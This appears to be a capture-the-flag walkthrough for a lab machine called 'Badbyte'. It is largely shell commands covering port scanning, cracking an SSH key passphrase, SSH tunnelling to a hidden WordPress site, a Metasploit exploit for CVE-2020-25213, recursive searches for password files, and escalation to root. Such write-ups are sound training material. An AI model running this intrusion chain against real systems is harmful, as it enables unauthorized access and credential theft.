# Badbyte - Easy

* Add ```badbyte.thm``` to ```/etc/hosts```

* ```nmap``` scan -

  ```sh
  # scan for open ports
  nmap -p- -vv badbyte.thm

  # scan the open ports for service enumeration
  nmap -A -p 22,30024 badbyte.thm
  ```

* FTP service with anonymous login running on 30024/tcp:

  ```sh
  ftp badbyte.thm 30024
  # anonymous login

  ls -la
  # we have id_rsa and a note.txt

  mget *

  exit

  cat note.txt
  # we get an username 'errrorcauser'

  # we can crack the id_rsa key
  chmod 600 id_rsa

  locate ssh2john

  python /opt/john/ssh2john.py id_rsa > hash_id_rsa

  john hash_id_rsa -w=/usr/share/wordlists/rockyou.txt
  # this cracks the key and gives "cupcake"
  ```

* We can log into SSH using the key and passphrase now:

  ```sh
  ssh errorcauser@badbyte.thm -i id_rsa
  # use the above passphrase

  id
  # command not found

  # we cannot run most of the basic bash commands
  # this is a limited shell
  
  ls
  # this works

  cat note.txt
  ```

* The note says the webserver has been setup locally; but we are unable to access as it is. We would need to do SSH tunnelling:

  ```sh
  ssh errorcauser@badbyte.thm -i id_rsa -D 1337
  # setup dynamic port forwarding

  # in attacker machine
  # setup proxychains
  vim /etc/proxychains.conf

  # we will have 'socks4 127.0.0.1 9050' at end of config
  # comment it out
  # and add config 'socks5 127.0.0.1 1337'

  # run port scan to enumerate internal ports on webserver using proxychains
  # command to be run on attacker machine
  proxychains nmap -sT 127.0.0.1

  # this lists the ports listening on localhost
  # webserver is running on port 80

  # perform local port forwarding to port 80 using -L
  ssh errorcauser@badbyte.thm -i id_rsa -L 4444:127.0.0.1:80
  # now we will be able to access the webserver running on victim port 80 on our port 4444
  ```

* After setting up local port forwarding:

  ```sh
  curl http://localhost:4444
  # we can check this on browser as well

  # the page says it is running WordPress

  # we can check this with nmap as well

  nmap -p 4444 127.0.0.1 -sC -sV -vv
  # scan with default scripts using -sC
  # service version enumeration using -sV
  # -vv for verbosity

  # it is indeed using WordPress
  # we can use wpscan

  wpscan --url http://127.0.0.1:4444 --enumerate vp
  # this does not show any vulnerable plugins

  wpscan --url http://127.0.0.1:4444 --enumerate u
  # this gives user 'cth'

  nmap -p 4444 127.0.0.1 -sC -sV -vv --script http-wordpress-enum --script-args type="plugins",search-limit=1500
  # this works
  # without specifying search-limit it will go for top 100 only

  # we get two plugins 'duplicator 1.3.26' and 'wp-file-manager 6.0'
  ```

* Googling for exploits associated with these WP plugins give us CVE-2020-11738 and CVE-2020-25213 - we can follow the latter as it is a RCE exploit:

  ```sh
  msfconsole

  search CVE-2020-25213
  # it is available

  use 0

  options
  # configure the options and run the exploit

  run
  # we get Meterpreter session

  sessions
  # need to interact with this

  session -i 1

  # in Meterpreter session
  shell
  # get Linux shell

  # get basic shell
  python3 -c 'import pty;pty.spawn("/bin/bash")'

  whoami
  # cth

  ls -la /home

  ls -la /home/cth
  # get user flag from here
  ```

* For privesc, we have been given a clue about passwords left in a file; we can use [password hunting methods](https://juggernaut-sec.com/password-hunting-lpe/):

  ```sh
  find / -exec ls -lad $PWD/* "{}" 2>/dev/null \; | grep -i -I "passw\|pwd"

  cd /var
  # search in this directory

  grep --color=auto -rnw -iIe "PASSW\|PASSWD\|PASSWORD\|PWD" --color=always 2>/dev/null
  # searches for these strings recursively

  # we find a few interesting files
  cat /var/log/bash.log

  # we get the old password here
  # we can try changing the year from 2020 to something more recent
  # this trick works and we are able to login as cth

  su cth
  # use new password here

  id
  # we are part of 'sudo' group
  # switch to root user

  sudo su -
  # enter cth password
  # we get root shell now
  ```
